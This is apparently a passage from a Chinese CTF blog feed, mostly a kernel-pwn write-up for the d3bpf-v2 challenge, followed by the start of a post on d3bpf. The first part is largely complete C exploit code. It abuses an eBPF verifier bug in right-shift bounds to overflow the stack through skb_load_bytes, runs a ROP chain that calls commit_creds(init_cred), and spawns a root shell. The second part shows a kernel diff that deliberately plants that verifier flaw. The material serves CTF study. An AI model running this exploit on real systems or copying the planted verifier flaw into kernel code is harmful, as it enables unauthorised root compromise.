\</span></span><br><span class="line"><span class="meta">        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory store, *(uint *) (dst_reg + off16) = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                       \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                       \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                         \</span></span><br><span class="line"><span class="meta">        .off = OFF,                           \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = OFF,                             \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_IMM(DST, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                        \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_REG(DST, SRC)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_REG(DST, SRC)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                    \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_IMM(OP, DST, IMM)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                         \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Program exit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_EXIT_INSN()             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;             \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_EXIT, \</span></span><br><span class="line"><span class="meta">        .dst_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .off = 0,                   \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_MAP_FD(DST, MAP_FD) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// varies from userspace bpf_map_info definition so need to redefine</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 id;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">    <span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">    __u32 ifindex;</span><br><span class="line">    __u32 btf_vmlinux_value_type_id;</span><br><span class="line">    __u64 netns_dev;</span><br><span class="line">    __u64 netns_ino;</span><br><span class="line">    __u32 btf_id;</span><br><span class="line">    __u32 btf_key_type_id;</span><br><span class="line">    __u32 btf_value_type_id;</span><br><span class="line">&#125; __attribute__((aligned(<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attrs, <span class="keyword">sizeof</span>(*attrs));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *map_attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, map_attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value, <span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    attr.flags = flags;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lookup_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">obj_get_info_by_fd</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_bpf_prog</span><span class="params">(struct bpf_insn *insn, <span class="keyword">uint32_t</span> cnt, <span class="keyword">int</span> *prog_fd_out, <span class="keyword">char</span> *write_buf, <span class="keyword">size_t</span> write_nbytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> prog_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> verifier_log_buff[<span class="number">0x200000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> socks[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attrs</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            .insn_cnt = cnt,</span><br><span class="line">            .insns = (<span class="keyword">uint64_t</span>)insn,</span><br><span class="line">            .license = (<span class="keyword">uint64_t</span>) <span class="string">&quot;&quot;</span>,</span><br><span class="line">            .log_level = <span class="number">2</span>,</span><br><span class="line">            .log_size = <span class="keyword">sizeof</span>(verifier_log_buff),</span><br><span class="line">            .log_buf = (<span class="keyword">uint64_t</span>)verifier_log_buff&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = *prog_fd_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt; prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write_nbytes != write(socks[<span class="number">1</span>], write_buf, write_nbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] write not so good\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        *prog_fd_out = prog_fd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        close(prog_fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    close(socks[<span class="number">0</span>]);</span><br><span class="line">    close(socks[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_REG BPF_REG_8</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack()                                    \</span></span><br><span class="line"><span class="meta">    BPF_MOV64_IMM(BPF_REG_9, 64),                   \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(EXP_REG, 1),                  \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_RSH, EXP_REG, BPF_REG_9), \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_0, EXP_REG)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">leak_insn</span>[] =</span> &#123;</span><br><span class="line">            attack(),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, EXP_REG, (<span class="number">16</span> - <span class="number">8</span>)),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">            BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">            BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_4, <span class="number">8</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),</span><br><span class="line">            BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0xFF</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(leak_insn, <span class="keyword">sizeof</span>(leak_insn) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>, buf, <span class="number">0x100</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        save_status();</span><br><span class="line">        signal(SIGSEGV, &amp;get_shell);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset = strtoul(argv[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = kernel_offset + <span class="number">0xffffffff810d7210</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = kernel_offset + <span class="number">0xffffffff82e6e860</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi_ret = kernel_offset + <span class="number">0xffffffff81097050</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode = kernel_offset + <span class="number">0xffffffff81e0100b</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> rop_chain[<span class="number">0x100</span>];</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        rop_chain[i++] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">        rop_chain[i++] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">        rop_chain[i++] = pop_rdi_ret;</span><br><span class="line">        rop_chain[i++] = init_cred;</span><br><span class="line">        rop_chain[i++] = commit_creds;</span><br><span class="line">        rop_chain[i++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">        rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">        rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">        rop_chain[i++] = &amp;get_shell;</span><br><span class="line">        rop_chain[i++] = user_cs;</span><br><span class="line">        rop_chain[i++] = user_rflags;</span><br><span class="line">        rop_chain[i++] = user_sp;</span><br><span class="line">        rop_chain[i++] = user_ss;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">attack_insn</span>[] =</span> &#123;</span><br><span class="line">            attack(),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, EXP_REG, (<span class="number">0x100</span> - <span class="number">8</span>)),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">            BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">            BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_4, <span class="number">8</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),</span><br><span class="line">            BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(attack_insn, <span class="keyword">sizeof</span>(attack_insn) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>, rop_chain, <span class="number">0x100</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230111180153062.png"                      alt="image-20230111180153062"                ></p><p>首先运行exp触发<code>soft panic</code>可以看到在其中存在酷似kernel代码段的地址信息，所以我们可以通过计算得到<code>kernel_offset</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230111180450710.png"                      alt="image-20230111180450710"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230111180529651.png"                      alt="image-20230111180529651"                ></p><p>最后成功提权。</p><hr><p>题目放在:<a class="link"   href="https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf-v2.zip" >https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf-v2.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;因为近期一直在玩内核，在把这篇文章写完之后就不会一直更新内核相关的了，后续的打算是学习完逃逸的内容之后就开始进行刷题和复现比赛的练习了。&lt;/p&gt;
&lt;h2 id=&quot;分析题目&quot;&gt;&lt;a href=&quot;#分析题目&quot; class=&quot;headerlink&quot; title=&quot;分析题目&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="ebpf" scheme="https://cv196082.gitee.io/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>d3bpf</title>
    <link href="https://cv196082.gitee.io/2023/01/06/d3bpf/"/>
    <id>https://cv196082.gitee.io/2023/01/06/d3bpf/</id>
    <published>2023-01-06T11:55:01.000Z</published>
    <updated>2023-01-06T11:55:39.052Z</updated>
    
    <content type="html"><![CDATA[<p>虽然在之前出过几篇关于bpf的文章，但是我并没有得到很深层次的理解，文章的exp基本就是copy的。并且，D3^CTF 2022还有两道ebpf需要复现，所以现在就选择了复现一下。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/fs/fs_context.c b/fs/fs_context.c</span><br><span class="line">index <span class="number">2834</span>d1afa.<span class="number">.0</span>a79c9099 <span class="number">100644</span></span><br><span class="line">--- a/fs/fs_context.c</span><br><span class="line">+++ b/fs/fs_context.c</span><br><span class="line">@@ <span class="number">-530</span>,<span class="number">7</span> +<span class="number">530</span>,<span class="number">7</span> @@ <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">legacy_parse_param</span><span class="params">(struct fs_context *fc, struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function">       param-&gt;key)</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">if</span> (len &gt; PAGE_SIZE - <span class="number">2</span> - size)</span><br><span class="line">+<span class="keyword">if</span> (size + len + <span class="number">2</span> &gt; PAGE_SIZE) <span class="comment">// patch for CVE-2022-0185</span></span><br><span class="line"> <span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span> (<span class="built_in">strchr</span>(param-&gt;key, <span class="string">&#x27;,&#x27;</span>) ||</span><br><span class="line">     (param-&gt;type == fs_value_is_string &amp;&amp;</span><br><span class="line">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="line">index <span class="number">37581919</span>e.<span class="number">.8e98</span>d4af5 <span class="number">100644</span></span><br><span class="line">--- a/kernel/bpf/verifier.c</span><br><span class="line">+++ b/kernel/bpf/verifier.c</span><br><span class="line">@@ <span class="number">-6455</span>,<span class="number">11</span> +<span class="number">6455</span>,<span class="number">11</span> @@ <span class="keyword">static</span> <span class="keyword">int</span> adjust_scalar_min_max_vals(struct bpf_verifier_env *env,</span><br><span class="line"> scalar_min_max_lsh(dst_reg, &amp;src_reg);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> BPF_RSH:</span><br><span class="line">-<span class="keyword">if</span> (umax_val &gt;= insn_bitness) &#123;</span><br><span class="line">-<span class="comment">/* Shifts greater than 31 or 63 are undefined.</span></span><br><span class="line"><span class="comment">- * This includes shifts by a negative number.</span></span><br><span class="line"><span class="comment">- */</span></span><br><span class="line">-mark_reg_unknown(env, regs, insn-&gt;dst_reg);</span><br><span class="line">+<span class="keyword">if</span> (umin_val &gt;= insn_bitness) &#123;</span><br><span class="line">+<span class="keyword">if</span> (alu32)</span><br><span class="line">+__mark_reg32_known(dst_reg, <span class="number">0</span>);</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+__mark_reg_known_zero(dst_reg);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> (alu32)</span><br><span class="line">diff --git a/net/packet/af_packet.c b/net/packet/af_packet.c</span><br><span class="line">index <span class="number">6b</span>bc7a448..d949fdf00 <span class="number">100644</span></span><br><span class="line">--- a/net/packet/af_packet.c</span><br><span class="line">+++ b/net/packet/af_packet.c</span><br><span class="line">@@ <span class="number">-4448</span>,<span class="number">9</span> +<span 